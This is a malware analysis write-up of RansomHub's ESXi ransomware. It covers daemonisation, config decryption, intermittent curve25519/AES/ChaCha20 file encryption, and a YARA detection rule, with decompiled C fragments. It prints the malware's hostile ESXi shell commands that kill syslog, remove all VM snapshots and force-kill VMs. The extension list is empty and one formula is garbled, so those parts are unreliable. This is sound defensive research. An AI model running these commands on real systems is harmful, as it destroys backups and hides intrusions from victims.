@@ -1,0 +1,269 @@
+---
+title: "RansomHub Ransomware"
+description: "A technical analysis of the ESXi ransomware from the RansomHub group"
+date: "2024-12-24"
+---
+
+## Abstract
+This report presents my detailed analysis of the main functions of the ransomware for ESXi from the RansomHub group.
+
+## RansomHub CTI
+
+RansomHub has emerged as a ransomware-as-a-service (RaaS) operation, especially following the disruption of other major groups like LockBit. The group seems to have risen quickly in the latter half of 2024. Notably, RansomHub is believed to be connected with former affiliates of other ransomware groups, such as LockBit and BlackCat, and they have adopted various tactics from these predecessors, including "living-off-the-land" strategies and cross-platform targets on both Linux and Windows systems​
+
+The group's activities have been marked by some distinct features. RansomHub reportedly offers affiliates the ability to control ransom payments directly, which has made it attractive to cybercriminals transitioning from other groups. It has been linked to several high-profile attacks, including those against corporations like Halliburton and Kawasaki Europe​. Additionally, RansomHub is involved in exploiting vulnerabilities in various sectors, including healthcare, and is known for its data exfiltration practices​
+
+RansomHub has attracted a notable group of affiliates, including individuals who previously worked with the now-defunct BlackCat and LockBit operations​. As such, it is seen as a new powerhouse in the ransomware ecosystem, using sophisticated extortion techniques and offering significant payouts for its affiliates
+
+---
+
+## Static Code Analysis
+
+### Daemon Process
+Upon starting its execution, the first thing ransomware does after parsing the command line is to check for the presence of the `-verbose` argument. If this argument is not specified, the program is configured to run as a daemon process, i.e. in the background.
+
+The background execution process begins with the creation of a child process using the `fork()` system call to duplicate the current process, creating a separate instance.
+
+If the process creation is successful, the parent (original) process waits for the completion of the child process (where the ransomware will continue its main execution) using `waitpid()`. 
+
+In the child process, where the ransomware will execute, the `setsid()` function is used to create a new session. This decouples the process from any controlling terminal. If `setsid()` fails, the process is immediately terminated with `exit(1)`.
+
+The default child process descriptors of `stdin`, `stdout`, `stderr` are also closed using `close()`. This prevents the daemon process from continuing to interact with the terminal. The closed descriptors are also redirected to `/dev/null` and duplicated with `dup()` to force any attempt to access the standard channels to be redirected to `/dev/null`.
+
+```c
+child_proc_pid_var = fork();
+if ( child_proc_pid_var < 0 )
+  exit(1);
+
+if ( child_proc_pid_var > 0 )
+{
+  puts("running...");
+
+  waitpid(child_proc_pid_var, stat_loc, 0);
+  
+  puts("done");
+  exit(0);
+}
+
+if ( setsid() < 0 )
+  exit(1);
+  
+close(0);
+close(1);
+close(2);
+
+open("/dev/null", 2);
+
+dup(0);
+dup(0);
+```
+
+### Configuration Decryption
+
+Before executing the main part of the malware, the ransomware needs to decrypt its configuration and for this the ransomware requires the operator to provide a password as an argument. This password is used to perform XOR-based decryption operations on the encrypted configuration. 
+
+With the password provided, the program transforms it using binary manipulation operations, after which a comparison is made with the data expected within the malware. If the password is incorrect, an error message is displayed and the process is terminated.
+
+If the password is correct, the malware uses XOR operations to decrypt the data. This process results in JSON that follows the format below:
+
+```
+{
+    "master_public_key": ,   curve25519 public key
+    "extension": ,           extension that will be added to the encrypted files.
+    "note_file_name": ,      name of the ransom note file.
+    "note_full_text": ,      full text of the ransom note.
+    "note_short_text": ,     customized text in the note added by the operator.
+    "encryption_files": ,    list of file extensions that should be encrypted.
+    "remove_vms_snapshot": , indicates if the snapshots of the virtual machines should be removed.
+    "shutdown_vms": ,        indicates if the virtual machines should be shut down.
+    "self_delete": ,         indicates if the ransomware should delete itself after execution.
+}
+```
+
+### Setting up ESXi for Encryption
+
+Before starting the encryption process, the ransomware carries out a series of steps to manipulate ESXi and ensure that the process takes place without interference. 
+
+#### Disable Virtual Machines Auto Start
+The first action taken by the malware is to disable the auto start function of the virtual machines on the ESXi host. 
+
+This prevents the VMs from restarting automatically or trying to start after encryption, which could corrupt any files. The command used for this action is:
+```sh
+/bin/sh -c vim-cmd hostsvc/autostartmanager/enable_autostart 0
+```
+
+#### Syslog Termination
+To make logging and analysis more difficult, the ransomware terminates the process responsible for syslog (vmsyslogd), which manages system logs. 
+
+It uses the command below to locate and terminate all running instances:
+```sh
+/bin/sh -c for i in $(ps -Cc | grep vmsyslogd | awk '!/grep/ {print $1}' | grep -o '[0-9]*'); do kill -9 $i;  done;
+```
+This command uses `ps` to list the processes, `grep` to locate `vmsyslogd`, and `kill -9` to force terminate each process found.
+
+#### Removing Snapshots
+The ransomware checks if it is configured to remove snapshots from virtual machines to prevent recovery after the attack. If this option is enabled, it executes the following command:
+```sh
+/bin/sh -c for i in $(vim-cmd vmsvc/getallvms | awk '{print $1}' | grep -o '[0-9]*'); do vim-cmd vmsvc/snapshot.removeall $i; done;
+```
+
+#### Stopping Virtual Machines
+The ransomware can be configured to interrupt the execution of virtual machines. If configured to do so, it performs the following steps:
+
+1. Checks if the `-skip_vms` argument has been specified. If so, it reads the file containing the names of the virtual machines that should not be shut down and stores the list in a variable.
+2. Get a list of all the virtual machines running, using the command:
+```sh
+/bin/sh -c localcli --formatter json vm process list 2>/dev/null
+```
+3. The ransomware parses the JSON output, comparing the `Display Name` field of each virtual machine with the list of machines configured to be spared.
+4. For all virtual machines that are not on the exclusion list, the ransomware executes the following command to forcibly shut it down, using the VM's corresponding `World ID`:
+```sh
+/bin/sh -c localcli vm process kill --type=force --world-id=%d 2>/dev/null
+```
+
+### Thread Pool
+After initialization, the ransomware enters its main execution phase.
+
+The ransomware starts by initializing a thread pool, where the number of threads is calculated as twice the number of available processors. 
+```c
+thread_pool_var = thread_pool_init_fn(2 * processors_count);
+```
+
+After initializing the thread pool, the ransomware calls a function to search for files that should be encrypted. The initial path for the search is specified by the `-path` argument
+
+When the search ends, a function waits for all pending tasks in the thread pool to finish before destroying it:
+```c
+thread_pool_wait_fn(thread_pool_var);
+thread_pool_destroy_fn(thread_pool_var);
+```
+
+### Recursive search
+To find files that should be encrypted, the ransomware uses a recursive search algorithm to iterate over directories and files
+
+#### Drop Note
+
+Before processing the contents of a directory, the ransomware creates a ransom note. The note is generated by concatenating the current directory path with the name of the note file defined in the configuration:
+```c
+strcpy(note_path_var, path_var);
+strcat(note_path_var, "/");
+strcat(note_path_var, *((const char **)&config + 2)); /* note file name from config */
+
+note_file_handle_var = fopen(note_path_var, "w");
+if ( note_file_handle_var )
+{
+    fwrite(*((const void **)&config + 3), 1, strlen(*((const char **)&config + 3)), note_file_handle_var); /* note content from config */
+    fclose(note_file_handle_var);
+}
+```
+
+#### Files Search
+
+The search for files then begins by opening the directory with the `opendir()` function. Next, each entry in the directory is analyzed in a while loop using `readdir()`.
+
+If the entry is a directory, it is concatenated with the current path, and the recursive search function is called again with the new path.
+
+If the input is a file, the ransomware checks that it is a virtual machine file and that it does not belong to a list of VMs to be ignored.
+
+The list of extensions used to say that it is a virtual machine file by default is:
+```
+```
+
+If the criteria are met, the file is added as a new task to the thread pool to be encrypted.
+
+### File Encryption
+As soon as a file is added to the threadpool, the encryption process starts.
+
+#### Key Generation
+Initially, the ransomware generates a random private key for the curve25519 algorithm. From this private key, a public key is derived, which will later be used to create a shared key. The public key generated by the ransomware is combined with a master public key (stored in the decrypted configuration), and a shared key is derived. This shared key will be used as the key for the symmetric encryption process.
+
+After generating the keys, the ransomware checks whether the processor of the machine it is running on supports the AES-NI instruction set. If the processor is compatible, the ransomware uses AES-256, with SIMD optimizations. Otherwise, the ransomware uses the ChaCha20 algorithm, using a random nonce.
+
+#### File Processing
+The file encryption process is carried out intermittently, with the ransomware skipping blocks of data between encryption operations. The amount of data that will be “skipped” between each operation is based on the size of the file being encrypted.
+
+The table below shows the jump size values between the encrypted blocks defined according to the file size:
+
+| File Size         | Skip Size |
+|-------------------|-----------|
+| ≤ 2 MB            | 0 B       |
+| > 2 MB ≤ 8 MB     | 1 MB      |
+| > 8 MB ≤ 32 MB    | 2 MB      |
+| > 32 MB ≤ 128 MB  | 3 MB      |
+| > 128 MB ≤ 512 MB | 4 MB      |
+| > 512 MB ≤ 2 GB   | 5 MB      |
+| > 2 GB ≤ 8 GB     | 6 MB      |
+| > 8 GB ≤ 32 GB    | 7 MB      |
+| > 32 GB ≤ 128 GB  | 8 MB      |
+| > 128 GB ≤ 512 GB | 9 MB      |
+| > 512 GB          | 10 MB     |
+
+If the `-fast` parameter is specified, the skip size value is multiplied by four, thus increasing the amount of data skipped between the encrypted parts, which speeds up the encryption process.
+
+After setting the skip size, the ransomware creates a data structure that stores information such as the skip size, the file's public key, the nonce and other variables that will be used to decrypt the file later. This structure is then written at the end of the encrypted file.
+
+The formula is used to calculate the number of parts that need to be encrypted:
+```
+part_size = ((skip_size + 1MB) + file_size -1 ) / skip_size 1MB
+```
+
+After determining the number of parts to be encrypted, the ransomware runs through the file in a loop and encrypts each part. For each part, it reads 1MB of data, encrypts the data using the selected algorithm (AES-256 or ChaCha20) and then writes the encrypted data back to the file. The offset is updated at each iteration, skipping the amount defined by the skip size.
+
+Below is an excerpt from the decompiled code that encrypts the file:
+```c
+skip_size = calculate_skip_size(file_size);
+part_size = skip_size + 0x100000;
+parts_count = (part_size + file_size - 1) / part_size;
+
+if ( parts_count )
+{
+  offset = 0;
+  for ( i = 0; i < parts_count; ++i )
+  {
+    fseek(file_handle, offset, 0);
+
+    bytes_read = fread(file_1mb_buffer, 1, 0x100000, file_handle);
+    if ( !bytes_read )
+      break;
+
+    if ( have_aes_ni )
+      aes_encrypt(file_1mb_buffer,file_1mb_buffer, bytes_read, &v33, aes_context);
+    else
+      chacha_encrypt(chacha_context, file_1mb_buffer, bytes_read);
+
+    fseek(file_handle, -bytes_read, 1);
+
+    fwrite(file_1mb_buffer, 1, bytes_read, file_handle);
+
+    offset += part_size;
+  }
+}
+```
+
+Once all the data has been encrypted, the file is renamed with the extension configured in the ransomware using the `rename()` function.
+
+### Self Deletion
+
+After execution, if configured, the ransomware deletes itself with:
+```c
+unlink(argv[0]);
+```
+---
+
+## Yara Rule
+
+```c
+rule RansomHub_ESXi_Ransomware
+{
+    meta:
+        description = "Detects RansomHub ESXi Ransomware"
+        author = "@Gabriel-Lacorte"
+    strings:
+        $cmd_autostart = "vim-cmd hostsvc/autostartmanager/enable_autostart 0" ascii wide
+
+        $cmd_syslog = "for i in $(ps -Cc | grep vmsyslogd | awk '{print $1}'); do kill -9 $i; done;" ascii wide
+
+        $cmd_snapshot = "for i in $(vim-cmd vmsvc/getallvms | awk '{print $1}'); do vim-cmd vmsvc/snapshot.removeall $i; done;" ascii wide
+    condition:
+        any of ($cmd_*)
+}
+```
